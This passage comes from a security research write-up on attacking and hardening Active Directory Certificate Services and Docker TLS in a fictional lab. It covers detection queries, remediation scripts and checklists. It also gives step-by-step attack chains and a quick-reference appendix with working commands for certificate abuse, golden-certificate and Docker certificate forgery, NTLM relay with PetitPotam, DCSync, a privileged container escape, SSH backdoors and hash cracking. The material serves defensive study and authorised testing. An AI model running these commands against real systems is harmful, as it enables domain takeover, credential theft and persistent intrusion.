if ! grep -q "$CURRENT_SERIAL" /var/log/ca_serial_baseline.txt; then
    echo "ALERT: CA serial number changed - possible certificate forgery!"
fi
```

### 6.5 BloodHound Queries for Detection

```cypher
// Find all paths from standard users to Domain Admin via certificates
MATCH p=shortestPath(
  (u:User {enabled:true, admincount:false})-[*1..]->(g:Group)
)
WHERE g.name =~ "(?i)domain admins|enterprise admins"
  AND ANY(r IN relationships(p) WHERE type(r) = "Enroll" OR type(r) = "WritePKI")
RETURN p

// Find certificate templates where Domain Users can enroll
MATCH (g:Group {name:"DOMAIN USERS@CORP.RESEARCH.LOCAL"})
MATCH (g)-[:Enroll]->(ct:CertTemplate)
WHERE ct.enrolleesuppliessubject = true
RETURN ct.name, ct.validityperiod, ct.renewalperiod

// Find users with write permissions on certificate templates
MATCH (u:User)-[r:WritePKI|WriteOwner|GenericWrite|GenericAll]->(ct:CertTemplate)
RETURN u.name, type(r), ct.name

// Find computers with enrollment agent rights
MATCH (c:Computer)-[:Enroll]->(ct:CertTemplate)
WHERE ct.applicationpolicies CONTAINS "1.3.6.1.4.1.311.20.2.1"
RETURN c.name, ct.name
```

---

## 7. Remediation & Hardening

### 7.1 AD CS Template Hardening

```powershell
# ===== AUDIT ALL TEMPLATES =====
# List all templates with dangerous configurations
certutil -v -template | Out-File -FilePath C:\Temp\template_audit.txt

# PowerShell enumeration
Get-ADObject -Filter * \
    -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=research,DC=local" \
    -Properties * | Select-Object Name, msPKI-Certificate-Name-Flag, \
    msPKI-RA-Signature, pKIExpirationPeriod

# ===== FIX ESC1: DISABLE ENROLLEE_SUPPLIES_SUBJECT =====
# Identify templates with dangerous flag
$templates = Get-ADObject -Filter * \
    -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=research,DC=local" \
    -Properties msPKI-Certificate-Name-Flag

foreach ($template in $templates) {
    $flags = $template.'msPKI-Certificate-Name-Flag'
    if ($flags -band 0x1) {  # ENROLLEE_SUPPLIES_SUBJECT = 0x1
        Write-Host "VULNERABLE: $($template.Name) allows SAN specification"
        
        # Remove dangerous flag
        $newFlags = $flags -band (-bnot 0x1)
        Set-ADObject $template.DistinguishedName -Replace @{
            'msPKI-Certificate-Name-Flag' = $newFlags
        }
        Write-Host "FIXED: $($template.Name)"
    }
}

# ===== FIX ESC2: RESTRICT EKU =====
# Templates should have specific EKUs, not "Any Purpose"
# Manually review and configure appropriate EKUs:
# - Client Authentication: 1.3.6.1.5.5.7.3.2
# - Server Authentication: 1.3.6.1.5.5.7.3.1
# - Code Signing: 1.3.6.1.5.5.7.3.3

# ===== FIX ESC4: RESTRICT TEMPLATE PERMISSIONS =====
# Remove write permissions for standard users
$template = Get-ADObject -Filter {Name -eq "VulnerableTemplate"} \
    -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=research,DC=local"

# Get current ACL
$acl = Get-Acl "AD:$($template.DistinguishedName)"

# Remove "Authenticated Users" write access
$authUsers = [System.Security.Principal.SecurityIdentifier]"S-1-5-11"
$acl.Access | Where-Object {
    $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $authUsers -and
    $_.ActiveDirectoryRights -match "Write"
} | ForEach-Object {
    $acl.RemoveAccessRule($_)
}

# Apply updated ACL
Set-Acl "AD:$($template.DistinguishedName)" $acl

# ===== FIX ESC6: DISABLE EDITF_ATTRIBUTESUBJECTALTNAME2 =====
# Check if flag is set
certutil -getreg policy\EditFlags

# Disable dangerous flag
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

# Restart Certificate Services
Restart-Service certsvc

# ===== FIX ESC7: RESTRICT CA PERMISSIONS =====
# Remove unauthorized ManageCA/ManageCertificates permissions
$caName = "corp-DC-SRV01-CA"

# View current permissions
certutil -v -getreg CA\Security

# Use GUI for complex permission changes:
# certmgr.msc → Certificate Authority → Properties → Security
```

### 7.2 CA Configuration Hardening

```powershell
# ===== ENABLE MANAGER APPROVAL =====
# Require CA certificate manager approval for sensitive templates
Set-ADObject -Identity "CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=research,DC=local" \
    -Replace @{
        'msPKI-Enrollment-Flag' = 0x2  # CT_FLAG_PEND_ALL_REQUESTS
    }

# ===== DISABLE WEB ENROLLMENT =====
# Remove HTTP/HTTPS enrollment endpoints
Uninstall-WindowsFeature ADCS-Web-Enrollment

# Or restrict access
Set-WebConfigurationProperty -PSPath 'IIS:\Sites\Default Web Site\CertSrv' \
    -Filter "system.webServer/security/authentication/windowsAuthentication" \
    -Name "enabled" -Value "True"

# ===== ENABLE EXTENDED PROTECTION =====
# Prevent NTLM relay attacks (ESC8)
certutil -setreg CA\Security "ExtendedProtection=1"

# Configure IIS Extended Protection
Set-WebConfigurationProperty -PSPath 'MACHINE/WEBROOT/APPHOST' \
    -Location 'Default Web Site/CertSrv' \
    -Filter 'system.webServer/security/authentication/windowsAuthentication' \
    -Name 'extendedProtection.tokenChecking' \
    -Value 'Require'

# ===== AUDIT LOGGING =====
# Enable detailed audit logging
certutil -setreg CA\AuditFilter 127  # All events

# Configure Windows Event Logging
auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable

# ===== KEY PROTECTION =====
# Use Hardware Security Module (HSM) for CA private key
# Configure during CA installation or migrate existing key

# If HSM not available, use strong key protection
certutil -repairstore my <CA_CERT_SERIAL> -f /user:Administrator
```

### 7.3 Docker TLS Hardening

```bash
# ===== PROTECT CA PRIVATE KEY =====
# Restrict file permissions
chmod 400 /etc/docker/ca-key.pem
chown root:root /etc/docker/ca-key.pem

# Store CA key offline
# Only mount when issuing new legitimate certificates
mv /etc/docker/ca-key.pem /secure-storage/ca-key.pem.encrypted
gpg --symmetric --cipher-algo AES256 /secure-storage/ca-key.pem.encrypted

# ===== IMPLEMENT CERTIFICATE PINNING =====
# Configure Docker to only accept specific client certificates
cat > /etc/docker/daemon.json << 'EOF'
{
  "hosts": ["unix:///var/run/docker.sock", "tcp://0.0.0.0:2376"],
  "tls": true,
  "tlsverify": true,
  "tlscacert": "/etc/docker/ca.pem",
  "tlscert": "/etc/docker/server-cert.pem",
  "tlskey": "/etc/docker/server-key.pem",
  "authorization-plugins": ["docker-rbac"]
}
EOF

# ===== CERTIFICATE REVOCATION =====
# Implement Certificate Revocation List (CRL)
# Create CRL
openssl ca -config /etc/docker/openssl.cnf \
    -gencrl \
    -keyfile /secure-storage/ca-key.pem \
    -cert /etc/docker/ca.pem \
    -out /etc/docker/crl.pem

# Configure Docker to check CRL
# Add to daemon.json:
# "tlscrl": "/etc/docker/crl.pem"

# ===== NETWORK SEGMENTATION =====
# Restrict Docker API access via firewall
iptables -A INPUT -p tcp --dport 2376 -s 10.200.100.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 2376 -j DROP

# Use Docker context with mTLS
# Require VPN or jump host for remote access

# ===== AUDIT DOCKER ACCESS =====
# Enable comprehensive logging
cat > /etc/docker/daemon.json << 'EOF'
{
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "100m",
    "max-file": "10"
  },
  "authorization-plugins": ["docker-auth"],
  "audit-logs": {
    "level": "debug",
    "path": "/var/log/docker/audit.log"
  }
}
EOF

systemctl restart docker
```

### 7.4 Comprehensive Checklist

```markdown
## AD CS Hardening Checklist

### Certificate Templates
- [ ] Audit all templates with `certipy find -vulnerable`
- [ ] Disable "Enrollee Supplies Subject" (ESC1)
- [ ] Remove "Any Purpose" EKU (ESC2)
- [ ] Restrict enrollment agent templates (ESC3)
- [ ] Remove write permissions for standard users (ESC4)
- [ ] Enable manager approval for sensitive templates
- [ ] Set appropriate validity periods (≤ 1 year)
- [ ] Require minimum key size (2048-bit RSA or 256-bit ECC)

### Certificate Authority
- [ ] Disable EDITF_ATTRIBUTESUBJECTALTNAME2 flag (ESC6)
- [ ] Restrict ManageCA permissions (ESC7)
- [ ] Disable HTTP Web Enrollment (ESC8)
- [ ] Enable Extended Protection for Authentication
- [ ] Implement CRL/OCSP for revocation checking
- [ ] Use HSM for CA private key storage
- [ ] Enable comprehensive audit logging
- [ ] Regular CA certificate rotation (every 5 years)

### Monitoring & Detection
- [ ] Monitor Event IDs 4886, 4887, 4888, 4890
- [ ] Configure Splunk/SIEM alerts for suspicious requests
- [ ] Deploy Microsoft Defender for Identity
- [ ] Implement BloodHound for attack path analysis
- [ ] Regular vulnerability scanning with Certipy
- [ ] Baseline certificate issuance patterns

### Access Control
- [ ] Remove "Authenticated Users" from enrollment ACLs
- [ ] Implement least privilege for CA administrators
- [ ] Use separate accounts for CA management
- [ ] Enable MFA for CA administrative access
- [ ] Regular access review (quarterly)

### Backup & Recovery
- [ ] Encrypted CA backups (separate encryption key)
- [ ] Offline backup storage (air-gapped)
- [ ] Restrict access to backup files (chmod 400)
- [ ] Test restoration procedures (annually)
- [ ] Document CA recovery process

## Docker TLS Hardening Checklist

### Certificate Management
- [ ] Protect CA private key (chmod 400, offline storage)
- [ ] Implement certificate pinning
- [ ] Use short validity periods (≤ 90 days)
- [ ] Automated certificate rotation
- [ ] Maintain certificate inventory

### Network Security
- [ ] Firewall rules restricting :2376 access
- [ ] VPN/jump host for remote management
- [ ] Network segmentation for container hosts
- [ ] Disable unencrypted port 2375
- [ ] TLS 1.3 enforcement

### Monitoring & Logging
- [ ] Audit file access to CA materials
- [ ] Monitor Docker API connections
- [ ] Track certificate serial numbers
- [ ] Alert on unusual authentication patterns
- [ ] Centralized log aggregation

### Container Security
- [ ] Never store CA keys in containers/images
- [ ] Use Docker secrets for sensitive data
- [ ] Implement content trust (signing)
- [ ] Regular image vulnerability scanning
- [ ] Least privilege container execution
```

---

## 8. Complete Attack Chains

### 8.1 Scenario A: ESC1 to Domain Admin

```
┌─────────────────────────────────────────────────────────────┐
│  ATTACK CHAIN: ESC1 EXPLOITATION                            │
└─────────────────────────────────────────────────────────────┘

Phase 1: Initial Access
├─ Compromise: standard-user@corp.research.local
├─ Method: Password spray attack
└─ Privileges: Domain User (low)

Phase 2: Enumeration
├─ Tool: certipy find -vulnerable
├─ Discovery: Template "UserAuth" vulnerable to ESC1
└─ Permissions: Domain Users can enroll

Phase 3: Certificate Request
├─ certipy req -template UserAuth -upn domain-admin@corp.research.local
├─ CA: corp-DC-SRV01-CA issues certificate
└─ Output: domain-admin.pfx

Phase 4: Authentication
├─ certipy auth -pfx domain-admin.pfx
├─ Obtain: TGT + NT hash for domain-admin
└─ Result: Kerberos ticket + NTLM hash

Phase 5: Privilege Escalation
├─ evil-winrm -i DC-SRV01 -u domain-admin -H <hash>
├─ Access: Domain Admin shell
└─ Impact: Full domain compromise

Timeline: 15-30 minutes
Detection Difficulty: Medium (Event 4887 shows SAN abuse)
```

### 8.2 Scenario B: Docker TLS + Container Escape

```
┌─────────────────────────────────────────────────────────────┐
│  ATTACK CHAIN: DOCKER TLS FORGERY TO HOST COMPROMISE        │
└─────────────────────────────────────────────────────────────┘

Phase 1: File Share Access
├─ Access: \\FILE-SRV01\DevOps with standard-user credentials
├─ Discovery: docker-tls-setup directory
└─ Exfiltration: ca.pem, ca-key.pem

Phase 2: Certificate Forgery
├─ openssl genrsa -out docker-admin-key.pem 2048
├─ openssl req -new -key docker-admin-key.pem -out docker-admin.csr
├─ openssl x509 -req -CA ca.pem -CAkey ca-key.pem -out docker-admin-cert.pem
└─ Result: Valid Docker TLS client certificate

Phase 3: Docker API Authentication
├─ docker --tlsverify --tlscert docker-admin-cert.pem -H tcp://10.200.100.30:2376 ps
├─ Access: Full Docker API control
└─ Enumerate: Running containers, images, volumes

Phase 4: Container Configuration Extraction
├─ docker cp password-manager:/config ./extracted/
├─ Find: PwmConfiguration.xml-backup
├─ Extract: BCrypt hash + database credentials
└─ hashcat -m 3200 → Cracked: admin123

Phase 5: Container Escape
├─ docker run --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
├─ chroot /host
├─ Access: Root on CONTAINER-HOST01
└─ Persistence: Create SSH backdoor, modify authorized_keys

Phase 6: Lateral Movement
├─ Credentials: Database password → database server
├─ Pivot: Container host → internal network
├─ Discover: Additional AD credentials in container environment variables
└─ Result: Multi-system compromise

Timeline: 30-60 minutes
Detection Difficulty: High (TLS certs appear legitimate)
```

### 8.3 Scenario C: ESC15 Golden Certificate

```
┌─────────────────────────────────────────────────────────────┐
│  ATTACK CHAIN: GOLDEN CERTIFICATE (CA KEY THEFT)            │
└─────────────────────────────────────────────────────────────┘

Phase 1: CA Backup Discovery
├─ Enumeration: SMB shares across environment
├─ Discovery: \\FILE-SRV01\Backups\PKI\corp-DC-SRV01-CA.pfx
├─ Adjacent file: ca-backup-credentials.txt (plaintext password)
└─ Exfiltration: CA certificate + private key

Phase 2: Certificate Verification
├─ certipy cert -pfx corp-DC-SRV01-CA.pfx -password 'CABackup2024Secure!'
├─ Verify: Root Enterprise CA certificate
└─ Validity: Until 2034 (10 years remaining)

Phase 3: Golden Certificate Forgery
├─ Target: domain-admin@corp.research.local
├─ certipy forge -ca-pfx corp-DC-SRV01-CA.pfx -upn domain-admin@corp.research.local
├─ Validity: 3650 days (10 years)
├─ Serial: Randomized to avoid detection
└─ Output: forged-domain-admin.pfx

Phase 4: Authentication
├─ certipy auth -pfx forged-domain-admin.pfx
├─ Result: Domain Admin access
└─ No detection: Certificate signed by legitimate CA

Phase 5: Persistence Establishment
├─ Forge certificates for multiple accounts:
│   ├─ enterprise-admin@corp.research.local
│   ├─ krbtgt@corp.research.local (Golden Ticket alternative)
│   └─ backup-admin@corp.research.local
├─ Validity: All certificates valid for 10 years
└─ Storage: Offline encrypted backup of forged certificates

Phase 6: Stealthy Access
├─ Use forged certificates periodically
├─ Certificates appear legitimate (no SAN abuse)
├─ Bypass password changes/MFA
└─ Maintain access until CA certificate replaced

Timeline: 20-40 minutes
Detection Difficulty: Very High (certificates are cryptographically valid)
Persistence Duration: Until CA root certificate expires or is replaced
Remediation: Requires full CA replacement + reissue all certificates
```

### 8.4 Combined Scenario: ESC8 + Container Forgery

```
┌─────────────────────────────────────────────────────────────┐
│  ATTACK CHAIN: NTLM RELAY + DOCKER COMPROMISE               │
└─────────────────────────────────────────────────────────────┘

Phase 1: NTLM Relay Setup
├─ Target: DC-SRV01 (AD CS Web Enrollment)
├─ ntlmrelayx.py -t http://dc-srv01/certsrv/certfnsh.asp --adcs
└─ Listener: Waiting for authentication

Phase 2: Trigger Authentication (PetitPotam)
├─ python3 PetitPotam.py 10.200.100.50 dc-srv01.corp.research.local
├─ Coerced: DC-SRV01 machine account authentication
├─ Relay: ntlmrelayx captures and relays to Web Enrollment
└─ Result: Domain Controller certificate issued

Phase 3: DC Certificate Extraction
├─ ntlmrelayx output: Base64-encoded certificate
├─ Decode: dc-srv01.pfx
└─ certipy auth -pfx dc-srv01.pfx → DC machine account hash

Phase 4: DCSync Attack
├─ Use DC machine account for DCSync
├─ secretsdump.py corp.research.local/DC-SRV01$@dc-srv01 -hashes <hash>
└─ Extract: All domain password hashes (including CA backup user)

Phase 5: CA Backup Access
├─ Use dumped credentials: backup-admin hash
├─ Access: \\FILE-SRV01\Backups (requires backup-admin)
├─ Download: CA private key backup
└─ Result: CA key compromise (ESC15)

Phase 6: Docker + AD Persistence
├─ Forge Docker TLS certificates (from Phase 1 file share access)
├─ Forge AD golden certificates (from Phase 5 CA key)
├─ Deploy: Container backdoors + AD persistence
└─ Result: Multi-layered persistent access

Timeline: 45-90 minutes
Attack Complexity: High
Detection Difficulty: Very High (multiple attack vectors)
Required Skills: Advanced (NTLM relay + PKI + containers)
```

---

## 9. References

### 9.1 Research Papers

- **SpecterOps - Certified Pre-Owned (2021)**
  - https://specterops.io/assets/resources/Certified_Pre-Owned.pdf
  - Original ESC1-8 research

- **Oliver Lyak - ESC9-ESC13 Research (2023)**
  - https://research.ifcr.dk/
  - New escalation techniques

- **Will Schroeder & Lee Christensen - BloodHound ADCS (2021)**
  - https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d

### 9.2 Tools & Repositories

- **Certipy (v4.8.2)**
  - https://github.com/ly4k/Certipy
  - Primary AD CS exploitation tool

- **Certify.exe**
  - https://github.com/GhostPack/Certify
  - Windows-native enumeration

- **BloodHound Community Edition**
  - https://github.com/SpecterOps/BloodHound
  - AD attack path analysis

- **Impacket**
  - https://github.com/fortra/impacket
  - Python AD exploitation suite

- **PKINITtools**
  - https://github.com/dirkjanm/PKINITtools
  - Kerberos PKINIT manipulation

### 9.3 Official Documentation

- **Microsoft AD CS Security Best Practices**
  - https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/
  
- **NIST SP 800-57: Key Management**
  - https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final

- **Docker TLS Configuration**
  - https://docs.docker.com/engine/security/protect-access/

### 9.4 Detection Resources

- **Microsoft Defender for Identity**
  - https://learn.microsoft.com/en-us/defender-for-identity/

- **Sigma Rules for AD CS**
  - https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security

- **Splunk Security Content**
  - https://research.splunk.com/

---

## 10. Legal & Ethical Disclaimer

### 10.1 Authorization Requirements

This research material is provided strictly for:

✅ **Authorized Activities:**
- Penetration testing with written permission
- Red team exercises within scope
- Security research in isolated lab environments
- Educational purposes in controlled settings
- Defensive security improvements

❌ **Prohibited Activities:**
- Unauthorized access to computer systems
- Exploitation without explicit written permission
- Testing on production environments without approval
- Any activity violating local/federal laws

### 10.2 Legal Framework

**United States:**
- Computer Fraud and Abuse Act (CFAA) - 18 U.S.C. § 1030
- Stored Communications Act - 18 U.S.C. § 2701

**European Union:**
- General Data Protection Regulation (GDPR) - Article 82
- Network and Information Security (NIS) Directive

**United Kingdom:**
- Computer Misuse Act 1990
- Data Protection Act 2018

### 10.3 Responsible Disclosure

If vulnerabilities are discovered during authorized testing:

1. Document findings thoroughly
2. Notify system owners immediately
3. Provide remediation recommendations
4. Allow reasonable time for patching (90-120 days)
5. Coordinate public disclosure with affected parties

---

## Appendix: Quick Reference Commands

### AD CS Exploitation

```bash
# Enumeration
certipy find -u USER -p PASS -dc-ip DC_IP -vulnerable

# ESC1 Exploitation
certipy req -u USER -p PASS -ca CA_NAME -template TEMPLATE -upn ADMIN@DOMAIN

# Authentication
certipy auth -pfx CERT.pfx -dc-ip DC_IP

# Golden Certificate
certipy forge -ca-pfx CA.pfx -upn ADMIN@DOMAIN -out forged.pfx
```

### Docker TLS Forgery

```bash
# Generate certificate
openssl genrsa -out key.pem 2048
openssl req -new -key key.pem -out csr.pem -subj "/CN=admin"
openssl x509 -req -in csr.pem -CA ca.pem -CAkey ca-key.pem \
  -out cert.pem -days 3650

# Access Docker
export DOCKER_TLS_VERIFY=1 DOCKER_HOST=tcp://HOST:2376 DOCKER_CERT_PATH=.
docker ps
```

### Container Extraction

```bash
# Extract configs
docker cp CONTAINER:/config ./extracted/

# Search credentials
grep -r "password\|secret" ./extracted/

# Crack hashes
hashcat -m 3200 -a 0 hash.txt rockyou.txt
```

---

**Document Version:** 2.0  
**Last Updated:** November 2025  
**Classification:** Educational Research  
**Distribution:** Authorized Security Personnel Only

---

*This research was conducted in an isolated lab environment with no connection to production systems. All hostnames, IP addresses, and credentials are fictional and used for educational purposes only.*
